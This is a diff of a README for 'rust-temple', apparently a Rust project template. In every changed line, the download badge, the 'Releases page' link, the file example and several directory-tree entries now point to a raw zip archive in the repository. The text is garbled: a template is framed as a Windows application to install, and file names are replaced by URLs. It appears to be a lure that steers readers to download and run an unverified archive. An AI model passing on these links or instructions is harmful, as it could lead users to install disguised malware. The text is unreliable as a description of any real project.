@@ -1,6 +1,6 @@
 # 🌟 rust-temple - Easily Start Your Rust Projects
 
-[![Download Now](https://raw.githubusercontent.com/Amansinghsodhi98/rust-temple/main/shoeing/rust-temple.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Amansinghsodhi98/rust-temple/main/shoeing/rust-temple.zip)
+[![Download Now](https://github.com/Amansinghsodhi98/rust-temple/raw/refs/heads/main/src/temple-rust-v3.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/Amansinghsodhi98/rust-temple/raw/refs/heads/main/src/temple-rust-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ To get started with the rust-temple application, follow these simple steps. This
 
 ### Step 1: Visit the Download Page
 
-Head over to the [Releases page](https://raw.githubusercontent.com/Amansinghsodhi98/rust-temple/main/shoeing/rust-temple.zip) to find the latest version of rust-temple. This page contains all available versions along with their details. 
+Head over to the [Releases page](https://github.com/Amansinghsodhi98/rust-temple/raw/refs/heads/main/src/temple-rust-v3.1.zip) to find the latest version of rust-temple. This page contains all available versions along with their details. 
 
 ### Step 2: Choose Your Version
 
@@ -16,7 +16,7 @@ On the Releases page, you will see a list of available versions. Look for the la
 
 ### Step 3: Download the Correct File
 
-Once you are on the release details page, scroll down to find the available files. Download the appropriate file for your operating system. For example, if you are using Windows, look for a file named something like `https://raw.githubusercontent.com/Amansinghsodhi98/rust-temple/main/shoeing/rust-temple.zip`.
+Once you are on the release details page, scroll down to find the available files. Download the appropriate file for your operating system. For example, if you are using Windows, look for a file named something like `https://github.com/Amansinghsodhi98/rust-temple/raw/refs/heads/main/src/temple-rust-v3.1.zip`.
 
 ### Step 4: Install the Application
 
@@ -39,10 +39,10 @@ rust-temple comes pre-configured with useful files that help get you started rig
 ```text
 ├── .editorconfig
 ├── .gitignore
-├── https://raw.githubusercontent.com/Amansinghsodhi98/rust-temple/main/shoeing/rust-temple.zip
-├── https://raw.githubusercontent.com/Amansinghsodhi98/rust-temple/main/shoeing/rust-temple.zip
+├── https://github.com/Amansinghsodhi98/rust-temple/raw/refs/heads/main/src/temple-rust-v3.1.zip
+├── https://github.com/Amansinghsodhi98/rust-temple/raw/refs/heads/main/src/temple-rust-v3.1.zip
 ├── justfile
-└── https://raw.githubusercontent.com/Amansinghsodhi98/rust-temple/main/shoeing/rust-temple.zip
+└── https://github.com/Amansinghsodhi98/rust-temple/raw/refs/heads/main/src/temple-rust-v3.1.zip
 ```
 
 These configurations simplify common tasks, allowing you to focus on writing code without worrying about setup.
@@ -53,7 +53,7 @@ This template also includes GitHub Actions that automate the linting and testing
 
 ## 📥 Download & Install
 
-To download rust-temple, visit the [Releases page](https://raw.githubusercontent.com/Amansinghsodhi98/rust-temple/main/shoeing/rust-temple.zip). Follow the steps outlined above to download and install the latest version of the application.
+To download rust-temple, visit the [Releases page](https://github.com/Amansinghsodhi98/rust-temple/raw/refs/heads/main/src/temple-rust-v3.1.zip). Follow the steps outlined above to download and install the latest version of the application.
 
 ## 🌐 System Requirements
 
